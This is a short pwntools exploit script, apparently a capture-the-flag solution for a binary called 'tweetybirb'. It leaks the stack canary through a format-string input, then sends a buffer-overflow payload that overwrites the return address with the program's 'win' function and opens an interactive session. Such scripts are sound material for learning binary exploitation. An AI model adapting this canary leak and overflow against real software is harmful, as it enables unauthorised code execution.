from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *0x0000000000401272
continue
'''.format(**locals())

exe = './challenge/tweetybirb'
elf = context.binary = ELF(exe, checksec=False)

p = start()
p.recvline()
p.sendline(b'%15$016lx')

canary = int(p.recvline(), 16)
info("Leak canary: " + hex(canary))

payload  = flat(
    cyclic(72),
    canary,
    0,              # rbp
    elf.sym[b'win']
)

p.sendline(payload)
p.interactive()
